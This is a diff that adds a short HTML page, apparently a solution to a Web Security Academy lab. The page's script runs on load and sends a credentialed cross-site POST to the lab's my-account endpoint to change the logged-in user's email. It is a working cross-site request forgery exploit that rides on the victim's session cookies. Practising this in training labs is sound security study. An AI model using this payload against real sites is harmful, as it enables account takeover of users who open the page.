@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fa">
+    <source>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTTP Request</title>
+</head>
+<body>
+    <h1> XMLHttpRequest </h1>
+   <!--  <button onclick="sendRequest()">ارسال درخواست</button>
+    <p id="result"></p> -->
+
+<script>
+    function runcs() {
+
+let xhtp = new XMLHttpRequest();
+xhtp.onreadystatechange=function(){
+
+    if(this.readyState==4 && this.status==200){
+console.log('succsess change')
+
+    }
+};
+
+xhtp.open('POST','https://0aa4001b042d1ecf80a2354b002a0001.web-security-academy.net/my-account?id=wiener',true);
+xhtp.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
+xhtp.withCredentials=true;
+xhtp.send("Email=yasin1234h@gmail.com");
+    }
+window.onload=function()
+{
+    runcs();
+};
+
+
+</script>
+
+
+
+    <script src="script.js"></script>
+
+</body>
+</html>
